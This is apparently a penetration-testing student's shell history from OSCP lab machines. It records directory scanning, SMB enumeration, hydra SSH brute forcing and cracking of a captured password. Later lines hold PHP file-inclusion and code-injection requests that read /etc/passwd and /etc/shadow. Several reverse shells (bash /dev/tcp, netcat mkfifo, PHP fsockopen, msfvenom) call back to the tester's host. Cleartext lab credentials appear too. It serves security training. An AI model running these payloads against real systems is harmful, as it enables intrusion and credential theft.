  820  2020-08-26 07:49  gobuster dir -u http://10.11.1.31/_vti_pvt/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,cnf,html,php,asp,aspx,jsp" -o "/home/kali/OSCP/results/10.11.1.31/scans/tcp_5985_http_gobuster_dirbuster.txt"\n
  821  2020-08-26 07:58  cur lhttp://10.11.1.31/_vti_pvt/services.cnf
  822  2020-08-26 07:58  curl http://10.11.1.31/_vti_pvt/services.cnf
  823  2020-08-26 07:58  curl http://10.11.1.31/_vti_pvt/Service.cnf
  824  2020-08-26 11:02  http://10.11.1.31/_vti_pvt/bots.cnf 
  825  2020-08-26 18:47  http://10.11.1.31/_vti_pvt/bots.cnf l
  826  2020-08-26 18:47  cd ~/OSCP/results/10.11.1.31/exploit
  827  2020-08-26 18:50  ~/OSCP/results/10.11.1.31/exploit
  828  2020-08-26 18:50  nmblookup 
  829  2020-08-26 18:50  nmblookup  10.11.1.312
  830  2020-08-26 18:50  nmblookup  10.11.1.31
  831  2020-08-26 18:50  nmblookup  -A 10.11.1.31
  832  2020-08-26 18:51  nmblookup  -h 10.11.1.31
  833  2020-08-26 18:51  nmblookup  -H 10.11.1.31
  834  2020-08-26 18:52  nmap --script smb-vuln* -p 139,445 10.11.1.31
  835  2020-08-26 18:53  smbclient -L \\10.11.1.31
  836  2020-08-26 18:59  hydra -L "guest" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 1337 -o "/home/kali/OSCP/results/10.11.1.31/scans/tcp_1337_ssh_hydra.txt" ssh://10.11.1.31
  837  2020-08-26 18:59  hydra  guest -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 1337 -o "/home/kali/OSCP/results/10.11.1.31/scans/tcp_1337_ssh_hydra.txt" ssh://10.11.1.31
  838  2020-08-26 18:59  hydra -L guest -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 1337 -o "/home/kali/OSCP/results/10.11.1.31/scans/tcp_1337_ssh_hydra.txt" ssh://10.11.1.31
  839  2020-08-26 19:00  #                medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 1337 -O "/home/kali/OSCP/results/10.11.1.31/scans/tcp_1337_ssh_medusa.txt" -M ssh -h 10.11.1.31\n
  840  2020-08-26 19:00  vim name.txt
  841  2020-08-26 19:09  smbmap
  842  2020-08-26 19:14  cat name.txt
  843  2020-08-26 19:18  nmap --script safe -p 445 10.11.1.31
  844  2020-08-26 19:20  cat tcp_80_http_auth_hydra.txt
  845  2020-08-26 19:21  gobuster dir -u http://10.11.1.31/_private/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,cnf,html,php,asp,aspx,jsp" -o "/home/kali/OSCP/results/10.11.1.31/scans/tcp_5985_http_gobuster_dirbuster.txt"\n
  846  2020-08-26 19:23  gobuster dir -u http://10.11.1.31/_vti_txt/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,cnf,html,php,asp,aspx,jsp" -o "/home/kali/OSCP/results/10.11.1.31/scans/tcp_5985_http_gobuster_dirbuster.txt"\n
  847  2020-08-26 19:23  gobuster dir -u http://10.11.1.31/_vti_script/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,cnf,html,php,asp,aspx,jsp" -o "/home/kali/OSCP/results/10.11.1.31/scans/tcp_5985_http_gobuster_dirbuster.txt"\n
  848  2020-08-26 19:25  smbclient -L //10.11.1.31
  849  2020-08-26 19:26  smbmap -H 10.11.1.31
  850  2020-08-26 19:26  smbmap -H 10.11.1.31/guest
  851  2020-08-26 19:26  smbmap -H 10.11.1.31/wwwroot
  852  2020-08-26 19:27  smbmap -H //10.11.1.31/wwwroot
  853  2020-08-26 19:27  smbmap -H //10.11.1.31
  854  2020-08-26 19:27  smbmap -H //10.11.1.31/guest
  855  2020-08-26 19:31  curl http://10.11.1.31/restricted.htm
  856  2020-08-26 19:38  http://10.11.1.31/_vti_pingit/pingit.py
  857  2020-08-26 19:38  curlhttp://10.11.1.31/_vti_pingit/pingit.py
  858  2020-08-26 19:47  curl http://10.11.1.31/_vti_pingit/pingit.html
  859  2020-08-26 19:55  curl http://10.11.1.31/_vti_pvt/uniqperm.cnf
  860  2020-08-26 19:56  cp CTF_template.ctb ../OSCP/results/10.11.1.31/report
  861  2020-08-26 19:56  cd ../OSCP/results/10.11.1.31/report
  862  2020-08-26 19:57  cat name.txt tcp_80_http_nikto.txt
  863  2020-08-26 20:00  cat smbclient.txt smbmap-execute-command.txt smbmap-list-contents.txt smbmap-share-permissions.txt
  864  2020-08-26 20:03  smbmap -R IPC -H 10.11.1.31
  865  2020-08-26 20:04  smbmap -R IPC$ -H 10.11.1.31
  866  2020-08-26 20:07  gpp-decrypt zwsMmWyCYGhH8agGnGwanqafp2E0mSsxCfltP0JbpYbNDjTOJWr0dAhRejh1kBmBQxr9UwOjfhtHnsEibNWLR1RZ1mzn62JCUHhAyw1BdvM1OshRlXYYVX
  867  2020-08-26 20:10  curl http://10.11.1.31/_vti_pingit/pingit.py
  868  2020-08-26 20:12  hashid zwsMmWyCYGhH8agGnGwanqafp2E0mSsxCfltP0JbpYbNDjTOJWr0dAhRejh1kBmBQxr9UwOjfhtHnsEibNWLR1RZ1mzn62JCUHhAyw1BdvM1OshRlXYYVX
  869  2020-08-26 20:14  mysql -h 10.11.1.31 -P 1433 -u ralph \n
  870  2020-08-26 20:20  searchsploit "microsoft sql server"\n
  871  2020-08-26 20:28  sqlcmd 
  872  2020-08-26 20:29  sudo apt install sqlcmd 
  873  2020-08-26 20:30  curl https://packages.microsoft.com/config/rhel/8/prod.repo > /etc/yum.repos.d/msprod.repo\n
  874  2020-08-26 20:31  pip3 install mssql-cli
  875  2020-08-26 20:31  pip3 install --user mssql-cli
  876  2020-08-26 20:32  Mssql-cli
  877  2020-08-26 20:32  mssql-cli
  878  2020-08-26 20:33  sudo apt-get install sqsh\n
  879  2020-08-26 20:34  apt-get install sqsh\n
  880  2020-08-26 20:34  sqsh -S someserver -L user=sa -L password=password\n
  881  2020-08-26 20:35  sqsh -h
  882  2020-08-26 20:36  #
  883  2020-08-26 20:36  #sqsh -S 10.11.1.31 -L user=sa -L password=password
  884  2020-08-26 20:37  cd 10.11.1.31/report
  885  2020-08-26 20:52  #smbclient //10.10.10.59/ACCT -U Finance
  886  2020-08-26 21:33  smbclient //10.10.10.59/ACCT -U IPC
  887  2020-08-26 21:34  smbclient //10.11.11.31/ACCT -U IPC
  888  2020-08-26 21:34  smbclient //10.11.11.31/ACCT -U IPC$
  889  2020-08-26 21:34  smbclient //10.11.11.31/ -U IPC$
  890  2020-08-26 21:34  smbclient //10.11.11.31/ -U IPC
  891  2020-08-26 21:42  smbclient //10.10.10.59/IPC -U IPC
  892  2020-08-26 21:43  smbclient //10.10.10.59/wwwroot -U wwwroot
  893  2020-08-26 21:54  curl http://10.11.1.31/_vti_cnf/pagerror.gif
  894  2020-08-26 21:55  curl http://10.11.1.31/_vti_pvt/access.cnf
  895  2020-08-26 21:55  curl http://10.11.1.31/_vti_pvt/deptodoc.btr
  896  2020-08-26 22:01  smbclient --help
  897  2020-08-26 22:02  smbclient //10.10.10.31/IPC -U IPC
  898  2020-08-26 22:04  smbclient //10.10.10.31/wwwroot -U guest
  899  2020-08-26 22:04  smbclient //10.10.10.31/wwwroot -U ralph
  900  2020-08-26 22:05  smbclient 10.11.1.31:445 -U wwwroot
  901  2020-08-26 22:06  cat name.txt 
  902  2020-08-26 22:06  smbclient //10.10.10.31/wwwroot -U 10.11.1.31:445
  903  2020-08-26 22:06  smbclient 10.10.10.31/wwwroot -U krbtgt
  904  2020-08-26 22:07  smbclient //10.10.10.31/ -U krbtgt
  905  2020-08-26 22:07  smbclient //10.10.10.31/ -U guest
  906  2020-08-26 22:07  smbclient //10.10.10.31/wwwroot -U krbtgt
  907  2020-08-26 22:08  smbclient //10.10.10.31/wwwroot/ -U ""
  908  2020-08-26 22:10  smbclient //10.10.10.31/wwwroot/_vti_pvt/ -U ""
  909  2020-08-26 22:10  smbclient //10.10.10.31//wwwroot/_vti_pvt/ -U ""
  910  2020-08-26 22:16  smbclient //10.10.10.31//wwwroot/_vti_pvt/ -U "ralph"
  911  2020-08-26 22:16  smbclient //10.10.10.31/wwwroot/ -U "ralph"
  912  2020-08-26 22:17  vim _manual_commands.txt 
  913  2020-08-26 22:21  smbclient //10.10.10.31//wwwroot/_vti_pvt/ -U "guest"
  914  2020-08-26 22:22  smbmap -R wwwroot -H 10.11.1.31
  915  2020-08-26 22:23  smbmap -R guest -H 10.11.1.31
  916  2020-08-26 22:25  smbclient //10.10.10.31//wwwroot/_vti_pvt/ -U ralph
  917  2020-08-26 22:25  smbclient //10.10.10.31/wwwroot/_vti_pvt/ -U ralph
  918  2020-08-26 22:25  smbclient //10.10.10.31/wwwroot/ -U ralph
  919  2020-08-26 22:25  smbclient //10.10.10.31/wwwroot/ -U guest
  920  2020-08-26 22:25  smbclient //10.10.10.31/wwwroot/ -U wwwroot
  921  2020-08-26 22:27  smbclient //10.10.10.31/ -U wwwroot
  922  2020-08-26 22:29  smbclient \\10.10.10.31\wwwroot -U wwwroot
  923  2020-08-26 22:29  smbclient \\10.10.10.31\\wwwroot -U wwwroot
  924  2020-08-26 22:29  smbclient //10.10.10.31/wwwroot -U wwwroot
  925  2020-08-26 22:35  smbclient -L //10.10.10.31/wwwroot -U wwwroot
  926  2020-08-26 22:36  smbclient //10.10.10.31/aspnet_client -U IPC
  927  2020-08-26 22:36  smbclient //10.10.10.31/aspnet_client -U IPC -vvv
  928  2020-08-26 22:37  smbclient //http://10.11.1.31/_vti_pvt/access.cnf
  929  2020-08-26 22:37  smbclient //http://10.11.1.31/_vti_pvt/access.cnf -U ""
  930  2020-08-26 22:41  cat tcp_445_smb_ms06-025.txt
  931  2020-08-26 22:51  smbclient --list //10.11.1.31/
  932  2020-08-26 22:52  smbclient --list //10.11.1.31/ -U ""
  933  2020-08-26 22:53  smbclient -L //10.10.10.31/ -U wwwroot
  934  2020-08-26 23:13  cl
  935  2020-08-26 23:24  csat doctodep.btr
  936  2020-08-26 23:24  cat frontpg.lck
  937  2020-08-26 23:24  vim frontpg.lck
  938  2020-08-26 23:28  cat base-login.txt 
  939  2020-08-26 23:31  mv base-login.txt login-off.asp.txt ../report
  940  2020-08-27 00:30  cd system_web
  941  2020-08-27 00:30  cd 1_1_4322
  942  2020-08-27 00:31  vim SmartNav.htm
  943  2020-08-27 00:31  vim SmartNav.js
  944  2020-08-27 00:31  vim WebUIValidation.js
  945  2020-08-27 00:33  cat iisstart.htm
  946  2020-08-27 00:35  cat web.config
  947  2020-08-27 00:36  cat postinfo.html
  948  2020-08-27 00:36  rg 
  949  2020-08-27 00:36  curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\n
  950  2020-08-27 02:40  ~/.cargo/bin/cargo
  951  2020-08-27 02:40  ~/.cargo/bin/cargo install ripgrep
  952  2020-08-27 02:42  /home/kali/.cargo/bin/rg password
  953  2020-08-27 02:48  sqsh -S 10.11.1.31 -L user=& myUsrName & -L password=&myUsrPassword&
  954  2020-08-27 02:49  sqsh -S 10.11.1.31 -L user=&myUsrName& -L password=&myUsrPassword&
  955  2020-08-27 02:49  sqsh -S 10.11.1.31 
  956  2020-08-27 02:50  sqsh -S 10.11.1.31 -L user=ralph -L password=&myUsrPassword&
  957  2020-08-27 02:50  sqsh -S 10.11.1.31 -L user=ralph -L password=myUsrPassword
  958  2020-08-27 02:52  sqsh -S 10.10.10.59 -U sa -P "YE%TJC%&HYbe5Nw"
  959  2020-08-27 02:52  sqsh -S 10.10.10.59 -U myUsrName -P "myUsrPassword"
  960  2020-08-27 02:53  cd _vti_pvt
  961  2020-08-27 02:54  string
  962  2020-08-27 02:55  strings botinfs.cnf
  963  2020-08-27 03:26  strings access.cnf
  964  2020-08-27 03:26  catbotinfs.cnf
  965  2020-08-27 03:26  cat botinfs.cnf
  966  2020-08-27 03:26  cat ^M
  967  2020-08-27 03:26  cat deptodoc.btr
  968  2020-08-27 03:27  strsings deptodoc.btr
  969  2020-08-27 03:27  strings
  970  2020-08-27 03:27  strings deptodoc.btr
  971  2020-08-27 03:27  cat doctodep.btr
  972  2020-08-27 03:27  strings doctodep.btr
  973  2020-08-27 03:27  strings frontpg.lck
  974  2020-08-27 03:27  strings linkinfo.btr
  975  2020-08-27 03:27  strings service.cnf
  976  2020-08-27 03:28  strings service.lck
  977  2020-08-27 03:28  strings services.cnf
  978  2020-08-27 03:28  strings svcacl.cnf
  979  2020-08-27 03:28  strings uniqperm.cnf
  980  2020-08-27 03:32  strings writeto.cnf
  981  2020-08-27 03:32  strings web.config 
  982  2020-08-27 03:32  strings base-login.asp
  983  2020-08-27 03:32  cd aspnet_client/system_web/1_1_4322
  984  2020-08-27 03:33  strings SmartNav.htm
  985  2020-08-27 03:33  strings SmartNav.js
  986  2020-08-27 03:33  strings WebUIValidation.js
  987  2020-08-27 03:34  cd 2_0_50727
  988  2020-08-27 03:34  cat 4_0_30319/*
  989  2020-08-27 03:34  cd 4_0_30319
  990  2020-08-27 03:34  cd ~/OSCP/results/10.11.1.31/exploit/aspnet_client/system_web/4_0_30319
  991  2020-08-27 03:35  cd images
  992  2020-08-27 03:35  strings images
  993  2020-08-27 03:35  string login-off.asp login-off.asp.txt
  994  2020-08-27 03:35  strings login-off.asp login-off.asp.txta
  995  2020-08-27 03:36  strings postinfo.html
  996  2020-08-27 03:37  strings restricted.htm
  997  2020-08-27 03:37  strings _vti_inf.html
  998  2020-08-27 03:37  cd _private
  999  2020-08-27 03:37  cd _vti_cnf
 1000  2020-08-27 03:38  strings iisstart.htm
 1001  2020-08-27 03:39  strings pagerror.gif
 1002  2020-08-27 03:39  _cd_options _vti_log
 1003  2020-08-27 03:39  cd _vti_pingit
 1004  2020-08-27 03:39  strings pingit.html
 1005  2020-08-27 03:39  strings pingit.py
 1006  2020-08-27 03:40  cat pingit.py
 1007  2020-08-27 03:40  cd _vti_script
 1008  2020-08-27 03:40  cd _vti_txt
 1009  2020-08-27 03:40  strings web.config
 1010  2020-08-27 03:43  rg db
 1011  2020-08-27 03:44  string login-off.asp
 1012  2020-08-27 03:44  strings login-off.asp
 1013  2020-08-27 03:45  sqsh -S 10.10.10.59 -U sa -P "poiuytrewq"
 1014  2020-08-27 03:46  sqsh -S 10.10.10.59 -U sa -P poiuytrewq
 1015  2020-08-27 03:56  git clone https://github.com/samratashok/nishang.git
 1016  2020-08-27 04:07  Invoke-PowerShellTcp.ps1
 1017  2020-08-27 04:12  cd nishang/
 1018  2020-08-27 04:48  cat  login-off.asp
 1019  2020-08-27 04:48  cat base-login.asp
 1020  2020-08-27 04:48  cat base-login.txt
 1021  2020-08-27 04:51  cat nishang/
 1022  2020-08-27 04:51  cat shell.ps1
 1023  2020-08-27 05:50  type %WINDIR%\System32\drivers\etc\hosts\n
 1024  2020-08-27 07:19  cd Shells
 1025  2020-08-27 07:20  mv shell
 1026  2020-08-27 07:20  mv  shell.ps1 ../
 1027  2020-08-27 07:20  rm -rf nishang
 1028  2020-08-27 07:20  git commit -m "finished 31"
 1029  2020-08-27 07:23  cd screenshots
 1030  2020-08-27 07:23  /home/kali/.cargo/bin/rg db
 1031  2020-08-27 07:24  tree 
 1032  2020-08-27 07:27  ==
 1033  2020-08-27 07:29  export PATH="$HOME//home/kali/.cargo/bin/rg :$PATH"\n
 1034  2020-08-27 07:30  export PATH="$HOME/home/kali/.cargo/bin/rg :$PATH"\n
 1035  2020-08-27 07:30  export PATH="$HOME/home/kali/.cargo/bin/rg:$PATH"\n
 1036  2020-08-27 07:30  echo $PATH
 1037  2020-08-27 07:30  pip3
 1038  2020-08-27 07:30  rm -rf 10.11.1.35
 1039  2020-08-27 07:32  autorecon  10.11.1.35\n
 1040  2020-08-27 07:32  autorecon  10.11.1.31
 1041  2020-08-27 07:33  autorecon  10.11.1.39\n
 1042  2020-08-27 07:54  sqsh -S 10.11.1.31 -U sa -P poiuytrewq
 1043  2020-08-27 07:55  sqsh -S 10.11.1.31 -U sa -P "poiuytrewq"\n
 1044  2020-08-27 07:56  cd aspnet_client
 1045  2020-08-27 07:59  cd 10.11.1.24
 1046  2020-08-27 08:00  cd 10.11.1.13/scans
 1047  2020-08-27 08:04  cd 10.11.1.31/l
 1048  2020-08-27 08:04  cd 10.11.1.31/
 1049  2020-08-27 08:21  ls- a
 1050  2020-08-27 08:21  ls -a
 1051  2020-08-27 08:22  cd _vti_log
 1052  2020-08-27 08:23  mv 10.11.1.35 ../
 1053  2020-08-27 08:24  rmdir results
 1054  2020-08-27 08:25  nc -nlvp 1234
 1055  2020-08-27 08:27  mv aspnet_client base-login.asp base-login.txt iisstart.htm iisstart.png images login-off.asp login-off.asp.txt pagerror.gif postinfo.html _private restricted.htm _vti_cnf _vti_inf.html _vti_log _vti_pingit _vti_pvt _vti_script _vti_txt web.config exploit
 1056  2020-08-27 08:27  mv -r aspnet_client base-login.asp base-login.txt iisstart.htm iisstart.png images login-off.asp login-off.asp.txt pagerror.gif postinfo.html _private restricted.htm _vti_cnf _vti_inf.html _vti_log _vti_pingit _vti_pvt _vti_script _vti_txt web.config exploit
 1057  2020-08-27 08:28  rm aspnet_client
 1058  2020-08-27 08:28  rmdir aspnet_client
 1059  2020-08-27 08:28  rm -rf aspnet_client
 1060  2020-08-27 08:30  python -m SimpleHTTPServer 5555
 1061  2020-08-27 09:36  mv scans/ ~/OSCP/results/10.11.1.31/
 1062  2020-08-27 09:36  rm -rf results
 1063  2020-08-27 09:37  cd 10.11.1.20
 1064  2020-08-27 09:42  touch network.txt
 1065  2020-08-27 09:42  echo PS C:\Users\Administrator\Desktop> type network-secret.txt\n7eab8563146f16140c769072580cbcb3 >> network.txt\n
 1066  2020-08-27 09:43  echo PS C:\Users\Administrator\Desktop> proof.txt 7eab8563146f16140c769072580cbcb3 >> proof.txt
 1067  2020-08-27 09:43  rm type 
 1068  2020-08-27 09:45  curl http://10.11.1.35/section.php
 1069  2020-08-27 09:45  curl http://10.11.1.35//index.html
 1070  2020-08-27 09:46  curl http://10.11.1.35/files
 1071  2020-08-27 09:48  cd loot/
 1072  2020-08-27 10:05  curl /.hta.jsp
 1073  2020-08-27 10:06  cd results/10.11.1.35
 1074  2020-08-27 10:06  vim local.txt
 1075  2020-08-27 10:20  tcp_22_ssh_nmap.txt
 1076  2020-08-27 10:23  hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 22 -o "/home/kali/OSCP/results/results/10.11.1.35/scans/tcp_22_ssh_hydra.txt" ssh://10.11.1.35
 1077  2020-08-27 10:24  gobuster dir -u http://10.11.1.35:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -o "/home/kali/OSCP/results/10.11.1.35/scans/tcp_80_http_gobuster_dirbuster.txt"\n
 1078  2020-08-27 10:26  #gobuster dir -u http://10.11.1.35:80/files/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -o "/home/kali/OSCP/results/10.11.1.35/scans/tcp_80_http_gobuster_dirbuster/files.txt"\n
 1079  2020-08-27 10:27  gobuster dir -u http://10.11.1.35:80/files/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -o "/home/kali/OSCP/results/10.11.1.35/scans/tcp_80_http_gobuster_dirbuster/files.txt"\n
 1080  2020-08-27 10:28  curl http://10.11.1.35/index.html
 1081  2020-08-27 10:32  cat login-off.asp.txt
 1082  2020-08-27 10:38  gobuster dir -u http://10.11.1.35:80/files -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -o "/home/kali/OSCP/results/10.11.1.35/scans/tcp_80_http_gobuster_dirbusterfiles.txt"\n
 1083  2020-08-27 10:38  gobuster dir -u http://10.11.1.35:80/files/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -o "/home/kali/OSCP/results/10.11.1.35/scans/tcp_80_http_gobuster_dirbusterfiles.txt"\n
 1084  2020-08-27 10:57  git commit -m "finished .31"
 1085  2020-08-27 18:53  sudo apt install  givm
 1086  2020-08-27 18:54  sudo apt-get install vim-gnome
 1087  2020-08-27 18:58  cat tcp_80_http_gobuster_dirbusterfiles.txt
 1088  2020-08-27 19:04  curl -X POST --data "<?php echo shell_exec('ls'); ?>" "http://10.11.1.35/section.php?php://input%00"
 1089  2020-08-27 19:04  curlhttp://10.11.1.35/.htpasswd.php\?
 1090  2020-08-27 19:04  curl http://10.11.1.35/.htpasswd.php\?
 1091  2020-08-27 19:06  curl http://10.11.1.35/
 1092  2020-08-27 19:12  http://10.11.1.35/section.php\?page\=encdocs
 1093  2020-08-27 19:15  curl  --data "<?system(' ls');?>" "http://10.11.1.35/section.php?page=php://input%00"
 1094  2020-08-27 19:18  curl  --data "<?system(' ls');?>" "http://10.11.1.35/section.php?../etc/passwd"
 1095  2020-08-27 19:20  curl  --data "<?system(' ls');?>" "http://10.11.1.35/section.php?page=../../../../../../../../etc/shadow"
 1096  2020-08-27 19:20  curl  --data "<?system(' ls');?>" "http://10.11.1.35/section.php?page=../../../../../../../../etc/passwd"
 1097  2020-08-27 19:22  curl  --data "<?system(' ls');?>" "http://10.11.1.35/section.php?page=php://input&cmd=ls"
 1098  2020-08-27 19:23  curl  --data  "http://10.11.1.35/section.php?page=php://input&cmd=ls"
 1099  2020-08-27 19:23  curl   "http://10.11.1.35/section.php?page=php://input&cmd=ls"
 1100  2020-08-27 19:27  cat tcp_80_http_dirb_dirbuster.txt
 1101  2020-08-27 19:28  curl   "http://10.11.1.35/section.php?page=../../../../../../../../etc/shadow"
 1102  2020-08-27 19:29  curl   "http://10.11.1.35/section.php?page=ls ../../../../../../../../etc/"
 1103  2020-08-27 19:34  curl   "http://10.11.1.35/section.php?page=../../../../../../../../etc/passwd"
 1104  2020-08-27 19:37  http://10.11.1.35/section.php\?page\=http://192.168.182.128/shell.php
 1105  2020-08-27 19:41  sudo nc -nlvp 22
 1106  2020-08-27 19:55  searchsploit php
 1107  2020-08-27 19:55  searchsploit php shell
 1108  2020-08-27 19:55  locate generator/13282.php
 1109  2020-08-27 19:55  vim /usr/share/exploitdb/shellcodes/generator/13282.php
 1110  2020-08-27 20:16  msfvenom  -p  
 1111  2020-08-27 20:17  <?php $sock=fsockopen("192.168.119.217",1234);exec("/bin/sh -i <&3 >&3 2>&3"); 
 1112  2020-08-27 20:29  cp shell.php ~/OSCP/results/10.11.1.35/exploit
 1113  2020-08-27 20:29  cd ~/OSCP/results/10.11.1.35/exploit \n
 1114  2020-08-27 20:35  vim phponeline.php
 1115  2020-08-27 20:36  chmod +x phponeline.php 
 1116  2020-08-27 22:15  http://10.11.1.35/section.php\?page\=data:text/plain,%3C\?php%20echo%20shell_exec\(%27rm%20/tmp/f\;mkfifo%20/tmp/f\;cat%20/tmp/f\|/bin/sh%20-i%202%3E\&1\|nc%20192.168.119.217%201234%20%3E/tmp/f%27\)\;%20\?%3E
 1117  2020-08-27 23:05  sudo apt install tcpdump
 1118  2020-08-27 23:05  tcpdump -i tun0 icmp
 1119  2020-08-28 01:05  guide.txt
 1120  2020-08-28 01:06  touch guide.txt
 1121  2020-08-28 01:06  vim guide.txt
 1122  2020-08-28 01:14  <?php echo shell_exec('ls')
 1123  2020-08-28 01:14  <?php echo shell_exec('ls'); ?>
 1124  2020-08-28 01:14  <?php echo shell_exec('ls');?>
 1125  2020-08-28 01:15  touch perlshell.pl
 1126  2020-08-28 01:16  chmod +x perlshell.pl
 1127  2020-08-28 10:10  exec 5<>/dev/tcp/192.168.0.100/4444\n
 1128  2020-08-28 10:11  bash -i >& /dev/tcp/192.168.0.100/4444 0>&1\n
 1129  2020-08-28 10:11  bash -i >& /dev/tcp/192.168.119.217/4444 0>&1\n
 1130  2020-08-28 10:16  bash -i >& /dev/tcp/192.168.119.217/1234 0>&1
 1131  2020-08-28 10:16  cd /dev/
 1132  2020-08-28 10:31  vim perlshell.pl
 1133  2020-08-28 10:48  touch phpcmd.php
 1134  2020-08-28 10:50  lws
 1135  2020-08-28 10:50  chmod    +x phpcmd.php
 1136  2020-08-28 10:55  sudo nc -nv 192.168.119.217 80
 1137  2020-08-28 11:10  l>
 1138  2020-08-28 11:25  vimsh
 1139  2020-08-28 11:29  0<&196;exec 196<>/dev/tcp/192.168.119.217/1234; sh <&196 >&196 2>&196
 1140  2020-08-28 11:29  perl
 1141  2020-08-28 11:29  perl -h
 1142  2020-08-28 11:44  vim eviltext.txt
 1143  2020-08-28 20:50  cat eviltext.txt
 1144  2020-08-28 22:17  cat exploit/phpcmd.php
 1145  2020-08-28 22:23  vim phpcmd.php
 1146  2020-08-28 22:47  lcd results
 1147  2020-08-29 00:00  openssl
 1148  2020-08-29 00:13  msfvenom -p cmd/unix/reverse_netcat lhost=192.168.119.217 lport=1234 R
 1149  2020-08-29 00:56  ssh hack@10.11.1.35
 1150  2020-08-29 01:42  rm CTF_template.ctb\~\~\~ CTF_template.ctb\~\~ CTF_template.ctb\~
 1151  2020-08-29 01:43  cat 99d8f4f10cf80eed5cb67e73e8b60a3d >> proof.txt
 1152  2020-08-29 01:43  git commit -m "finished .35"
 1153  2020-08-29 01:54  cd/ /
 1154  2020-08-29 01:56  autorecon  10.11.1.44
 1155  2020-08-29 02:02  cp ~/Downloads/CTF_template.ctb ~/OSCP/results/10.11.1.39/report/
 1156  2020-08-29 02:02  cd ~/OSCP/results/10.11.1.39/report/  
 1157  2020-08-29 02:04  cat tcp_80_http_nikto.txt tcp_80_http_nikto.txt
 1158  2020-08-29 02:08  cat tcp_3306_mysql_nmap.txt
 1159  2020-08-29 04:03  crewl
 1160  2020-08-29 04:03  cewl
 1161  2020-08-29 04:19  curl http://10.11.1.39/
 1162  2020-08-29 04:23  curl http://10.11.1.39/otrs/index.pl -o loginpage.pl
 1163  2020-08-29 04:23  vim loginpage.pl
 1164  2020-08-29 04:32  time
 1165  2020-08-29 20:04  10.11.1.39/otrs/
 1166  2020-08-29 20:05  gobuster dir -u http://10.11.1.39:80/otrs/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o "/home/kali/OSCP/results/10.11.1.39/scans/tcp_80_http_gobuster_dirbuster.txt"\n
 1167  2020-08-29 20:35  cat tcp_80_http_gobuster_dirbuster.txt
 1168  2020-08-29 20:37  curl http://10.11.1.39/otrs/index.pl
 1169  2020-08-29 21:20  host
 1170  2020-08-29 21:20  hostname
 1171  2020-08-29 21:24  Cewl https://otrs.com/ -m 6 –w otrs-cewl.txt
 1172  2020-08-29 21:25  cewl https://otrs.com/ -m 6 –w otrs-cewl.txt
 1173  2020-08-29 21:26  cewl www.otrs.com/ -m 6 –w otrs-cewl.txt
 1174  2020-08-29 21:26  cewl www.otrs.com -m 6 –w otrs-cewl.txt
 1175  2020-08-29 21:26  cewl --help
 1176  2020-08-29 21:27  cewl https://doc.otrs.com/doc/  -m 6 –w otrs-cewl.txt
 1177  2020-08-29 21:29  cewl https://www.facebook.com/ -m 6 –w otrs-cewl.txt
 1178  2020-08-29 21:29  cewl  <url> https://otrs.com/ -m 6 –w otrs-cewl.txt
 1179  2020-08-29 21:30  cewl  -m 6 –w otrs-cewl.txt https://otrs.com/ 
 1180  2020-08-29 21:32  cewl  https://otrs.com/ 
 1181  2020-08-29 21:37  cewl https://otrs.com -m 6 –w otrs-cewl.txt
 1182  2020-08-29 21:38  cewl https://otrs.com -m 6 –w otrscewl.txt
 1183  2020-08-29 21:38  cewl https://otrs.com -m 6 –w otrscewl
 1184  2020-08-29 21:38  cewl https://otrs.com -m 6 –w otr
 1185  2020-08-29 21:38  cewl https://otrs.com -m 6 –w 
 1186  2020-08-29 21:38  cewl https://otrs.com -m 6 
 1187  2020-08-29 21:39  cewl -h
 1188  2020-08-29 21:39  cewl https://otrs.com -m 6 -W list.txt
 1189  2020-08-29 21:39  cewl https://otrs.com -m 6 --write
 1190  2020-08-29 21:39  cewl https://otrs.com -m 6 --write lol
 1191  2020-08-29 21:40  cewl https://otrs.com -m 6 –-write otrscewl.txt
 1192  2020-08-29 21:40  cewl https://otrs.com -m 6 --write otrscewl.txt
 1193  2020-08-29 21:43  vim otrscewl.txt
 1194  2020-08-29 21:43  vim /etc/john/john.conf
 1195  2020-08-29 21:45  sudo vim /etc/john/john.conf
 1196  2020-08-29 21:47  john --wordlist=otrscewl.txt --rules --stdout >  mutated.txt
 1197  2020-08-29 21:48  jonh
 1198  2020-08-29 21:49  which john
 1199  2020-08-29 21:49  locate johm
 1200  2020-08-29 21:49  locate john
 1201  2020-08-29 21:50  V
 1202  2020-08-29 21:50  /usr/sbin/john
 1203  2020-08-29 21:50  PATH=$PATH:/usr/sbin/john
 1204  2020-08-29 21:51  export PATH=$PATH:/usr/sbin/john
 1205  2020-08-29 21:51  source $PATH
